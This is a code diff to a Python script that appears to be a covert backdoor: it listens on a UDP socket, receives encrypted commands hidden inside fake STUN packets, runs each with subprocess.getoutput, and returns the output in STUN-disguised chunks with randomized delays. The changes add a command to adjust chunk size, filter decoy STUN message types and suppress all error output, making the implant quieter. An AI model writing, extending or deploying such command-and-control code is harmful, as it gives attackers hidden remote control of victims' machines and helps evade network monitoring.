@@ -7,6 +7,7 @@ from stun import build_stun_message
 my_pub_key = None
 my_priv_key = None
 target_pub_key = None
+CHUNK_SIZE = 20
 received_chunks = {}
 expected_chunks = None
 IP = "0.0.0.0"
@@ -24,9 +25,26 @@ def parse_public_key(text: str) -> rsa.PublicKey:
     except:
         return None
 
+def send_response(message, ip, port):
+    global target_pub_key, CHUNK_SIZE
+    try:
+        response = encrypt_message(message, target_pub_key)
+        if response["status"] == 200:
+            response = base64.b64encode(response["message"].encode()).decode()
+            chunks = fragment_message(response, CHUNK_SIZE)
+
+        time.sleep(1)
+        for chunk in chunks:
+            chunk = build_stun_message(chunk)
+            jitter_delay = 0.3 + random.uniform(-0.5, 0.5)
+            jitter_delay = max(0, jitter_delay)
+            time.sleep(jitter_delay)
+            sock.sendto(chunk, (ip, port))
+    except:
+        pass
 
 def listener():
-    global my_priv_key, expected_chunks, received_chunks, sock, IP, PORT, my_pub_key, target_pub_key
+    global my_priv_key, expected_chunks, received_chunks, sock, IP, PORT, my_pub_key, target_pub_key, CHUNK_SIZE
     sock.bind((IP, PORT))
     while True:
         try:
@@ -38,9 +56,14 @@ def listener():
             if len(attributes) < 4:
                 continue
             msg_type, msg_length = struct.unpack('!HH', header[:4])
+
+            if msg_type in [257, 273, 258]: # 0x0101, 0x0111, 0x0102, dummy STUN message types
+                continue
+            
             magic_cookie = struct.unpack('!I', header[4:8])[0]
             if magic_cookie != 0x2112A442:
                 continue
+            
             attr_type, attr_length = struct.unpack('!HH', attributes[:4])
             cmd = attributes[4:4+attr_length]
 
@@ -71,27 +94,24 @@ def listener():
                     full_command = base64.b64decode(full_command)
 
                     full_command = decrypt_message(full_command, my_priv_key)["message"]
+                    if full_command.startswith("target_chunk"):
+                        CHUNK_SIZE = int(full_command.split()[1])
+                        time.sleep(0.5)
+                        send_response("ACK", ip, port)
+                        received_chunks = {}
+                        expected_chunks = None
+                        gc.collect()
+                        continue
                     response = subprocess.getoutput(full_command)
-                    response = encrypt_message(response, target_pub_key)
-                    if response["status"] == 200:
-                        response = base64.b64encode(response["message"].encode()).decode()
-                        chunks = fragment_message(response)
-
-                    time.sleep(1)
-                    for chunk in chunks:
-                        chunk = build_stun_message(chunk)
-                        jitter_delay = 0.3 + random.uniform(-0.5, 0.5)
-                        jitter_delay = max(0, jitter_delay)
-                        time.sleep(jitter_delay)
-                        sock.sendto(chunk, (ip, port))
+                    send_response(response, ip, port)
                     received_chunks = {}
                     expected_chunks = None
 
                 else:
                     pass
-            except Exception as e:
-                print(e)
-        except Exception as e:
-            print(e)
+            except:
+                pass
+        except:
+            pass
         
 listener()
